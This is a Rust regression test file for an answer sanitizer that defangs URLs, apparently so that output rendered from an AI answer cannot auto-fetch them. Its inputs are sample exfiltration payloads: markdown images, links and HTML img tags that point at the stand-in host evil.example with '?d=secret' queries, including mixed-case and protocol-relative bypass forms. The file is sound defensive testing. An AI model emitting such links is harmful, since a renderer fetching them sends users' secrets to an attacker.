//! Regression tests for render-channel URL defanging in the answer sanitizer.
//! A planted markdown-image / link / html-`<img>` URL must not survive as a live
//! URL a downstream renderer would auto-fetch — across case variants and
//! protocol-relative forms (the parser-differential bypasses).

use symbi_invis_strip::sanitize_field_with_markup;

/// No live, renderer-fetchable URL may remain (case-insensitive + protocol-relative).
fn assert_no_live_url(out: &str) {
    let lo = out.to_ascii_lowercase();
    assert!(!lo.contains("http://") && !lo.contains("https://"),
            "live http(s) scheme survived: {out}");
    for ctx in ["](//", "=\"//", "='//", "=//"] {
        assert!(!lo.contains(ctx), "protocol-relative render target survived ({ctx}): {out}");
    }
}

#[test]
fn lowercase_scheme_defanged() {
    assert_no_live_url(&sanitize_field_with_markup("![x](http://evil.example/p?d=secret)"));
    assert_no_live_url(&sanitize_field_with_markup("[x](https://evil.example/p?d=secret)"));
}

#[test]
fn mixed_and_upper_case_scheme_defanged() {
    // renderers lowercase the scheme — so must the defang
    assert_no_live_url(&sanitize_field_with_markup("![x](HTTP://evil.example/p?d=secret)"));
    assert_no_live_url(&sanitize_field_with_markup("<img src=\"HtTpS://evil.example/i?d=secret\">"));
}

#[test]
fn protocol_relative_defanged() {
    // `//host` resolves against the page scheme and is fetched
    assert_no_live_url(&sanitize_field_with_markup("![x](//evil.example/p?d=secret)"));
    assert_no_live_url(&sanitize_field_with_markup("<img src=//evil.example/i>"));
    assert_no_live_url(&sanitize_field_with_markup("<img src=\"//evil.example/i\">"));
}

#[test]
fn idempotent_and_preserves_text() {
    let once = sanitize_field_with_markup("see ![x](HTTP://evil.example/p)");
    let twice = sanitize_field_with_markup(&once);
    assert_eq!(once, twice, "defang must be idempotent");
    assert!(once.contains("evil.example"), "host text stays visible to the human");
}
